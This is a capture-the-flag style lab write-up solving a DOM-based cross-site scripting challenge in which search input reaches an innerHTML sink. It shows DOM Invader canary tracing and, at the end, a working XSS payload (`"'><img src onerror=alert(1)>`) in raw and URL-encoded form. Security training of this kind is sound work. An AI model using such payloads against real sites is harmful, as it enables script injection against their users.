## 4 - DOM XSS in innerHTML sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

## Notes

- Search page
- Possibility to leave a comment

## Resume

1. Go on search page
2. Using DOM invader type the canary in **search**
3. Open DOM invader and **Search for Canary**
4. Exploit the DOM XSS

## Solve

Enable DOM invader and go on `/?search=` and paste the random **canary** from DOM invader in the search feature : 

`/?search=ec7oxw8l`

Open DOM invader and click on **Search for Canary** and see : 

Sinks (1)
    document.write (1)
| Value | outerHTML | Frame path | Event | Options |
|---|---|---|---|---|
| `ec7oxw8l` | 	`<span id="searchMessage"></span>`  | top |  | **Exploit** |

Stack Trace

```txt
-- DOM Invader: Logging stack trace
VM86:1     at _0x525c48 (augmented-dom-instrumentation.js:1:539463)
    at Object.vkGmi (augmented-dom-instrumentation.js:1:344679)
    at Object.pxFZz (augmented-dom-instrumentation.js:1:388875)
    at HTMLSpanElement.set [as innerHTML] (augmented-dom-instrumentation.js:1:389972)
    at doSearchQuery (?search=ec7oxw8l:53:84)
    at ?search=ec7oxw8l:57:33
```

Then click on **Exploit** and follow the redirection to : 

```
/?search="%27><img%20src%20onerror=alert(1)>
```

```js
"'><img src onerror=alert(1)>
```